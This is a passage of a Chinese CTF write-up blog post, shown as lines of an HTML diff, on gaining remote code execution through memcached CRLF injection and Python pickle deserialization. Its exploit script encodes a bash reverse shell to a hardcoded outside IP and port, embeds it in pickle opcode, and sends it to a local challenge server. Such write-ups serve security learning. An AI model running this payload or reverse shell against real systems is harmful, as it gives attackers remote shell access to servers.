src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678121881400-4efcb1a9-d71e-4440-beb2-587c8cdf0faa.png#averageHue=%23fefefb&clientId=u45f00354-e510-4&from=paste&height=327&id=u8cbe0cff&name=image.png&originHeight=409&originWidth=1590&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45932&status=done&style=none&taskId=u63dd590c-1f0f-48ac-93ad-0d498321f76&title=&width=1272" alt="image.png"><br>可以看到在进行get方法去除时，会对存入的数据进行pickle反序列化，因此得以RCE</p>
+<h1 id="5、EXP的编写"><a href="#5、EXP的编写" class="headerlink" title="5、EXP的编写"></a>5、EXP的编写</h1><p>这一点算是留给我的一个作业，因为目前网上并没有啥公布的Exp，因此打算自己试试，思路确定完就是写个py脚本，回顾侧重点，flag的值，payload的length，opcode编写<br>最后写出来的东西也是这样:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cmd</span>(<span class="params">ip,port</span>):</span><br><span class="line">    cmd=<span class="string">f&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;ip&#125;</span>/<span class="subst">&#123;port&#125;</span> &lt;&amp;1&#x27;&quot;</span></span><br><span class="line">    cmd=<span class="built_in">bytes</span>(cmd.encode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(base64.b64encode(cmd),<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">cmd=generate_cmd(<span class="string">&quot;114.116.119.253&quot;</span>,<span class="string">&quot;7777&quot;</span>)</span><br><span class="line">opcode=<span class="string">f&quot;cposix\nsystem\np1\n(S&#x27;echo <span class="subst">&#123;cmd&#125;</span> |base64 -d|bash -i&#x27;\np2\ntRp3\n.&quot;</span></span><br><span class="line">payload=quote(<span class="string">f&quot;\r\nset uwsgi_file__app_chall._add_1_1 1 3600 <span class="subst">&#123;<span class="built_in">len</span>(opcode)&#125;</span>\r\n<span class="subst">&#123;opcode&#125;</span>\r\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">url=<span class="string">&quot;http://localhost:5000/calc/add/233/233&quot;</span></span><br><span class="line">r1=requests.get(url+payload)</span><br><span class="line">url2=<span class="string">&quot;http://localhost:5000/calc/add/1/1&quot;</span></span><br><span class="line">r2=requests.get(url2)</span><br></pre></td></tr></table></figure>
+<p>解释一下payload，第一个payload将恶意opcode存入，第二个是去除该数据时触发pickle反序列化，因此getshell：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678123437263-8012faad-3130-4bc2-9324-ee9df62ef2b9.png#averageHue=%232e2d23&clientId=u45f00354-e510-4&from=paste&height=640&id=u2f8f6885&name=image.png&originHeight=800&originWidth=1499&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1261110&status=done&style=none&taskId=u9ba66057-b315-4eb0-942e-14203746104&title=&width=1199.2" alt="image.png"><br>至此算是基本结束了</p>
+<h1 id="6、其他的设想"><a href="#6、其他的设想" class="headerlink" title="6、其他的设想"></a>6、其他的设想</h1><p>Pymemcached会有这样的RCE漏洞，那么其他语言操作memcached服务器呢？首先CRLF注入肯定都会有的，但是RCE由于pypickle比较特殊，因此算特例，但是不代表别的就一定安全，既然有序列化和反序列化，那么就一定有安全隐患，因此这是留给我们自行去探索的，这里也可以拿来出题，会是一个不错的题目哟</p>
+<h1 id="注意事项和最后想说的话"><a href="#注意事项和最后想说的话" class="headerlink" title="注意事项和最后想说的话"></a>注意事项和最后想说的话</h1><p>首先说一下环境吧</p>
+<ul>
+<li>Windows Docker</li>
+<li>Pycharm</li>
+</ul>
+<p>上面的调试有时候并不是一个程序，假如需要在Pycharm调试的话，请确保以下几点：</p>
+<ul>
+<li>Python!&#x3D;3.7</li>
+<li>Dependency：python-memcached、pylibmc、flask[async]（搭在windows）</li>
+<li>虚拟机起个memcached</li>
+<li>源码里的memcached地址改一下XD</li>
+</ul>
+<p><strong>另外强烈推荐使用windows Docker进行分析</strong>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678123727892-4edaf230-0c47-457b-af2c-807a8971f044.png#averageHue=%23919e8f&clientId=u45f00354-e510-4&from=paste&height=736&id=ubad378c6&name=image.png&originHeight=920&originWidth=1601&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157347&status=done&style=none&taskId=u457f105c-89d8-437a-97a5-95548469405&title=&width=1280.8" alt="image.png"><br>在win10 docker中外部的访问和内部执行的命令都会一五一十的记录在内，可以更加直观的去分析，这一点我表示VeryNice</p>
+<p>那么就是最后想说的话了：<br>这一题写的时候是真的很开心，由一个正常的程序，根据调试发现了原理，再进行猜想与假设，然后去实践构造，最后RCE，是一个很令人兴奋的过程。这题是由3个师傅（包括我）一起解出的，也是感受到了战队里其他师傅的实力有多么强劲，希望自己这个菜鸡在后面不会拖后腿QWQ</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Python/" class="tag">#Python</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/10/KalmarCTF2023%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">KalmarCTF2023（部分）</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">XXE注入的Remake之旅</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
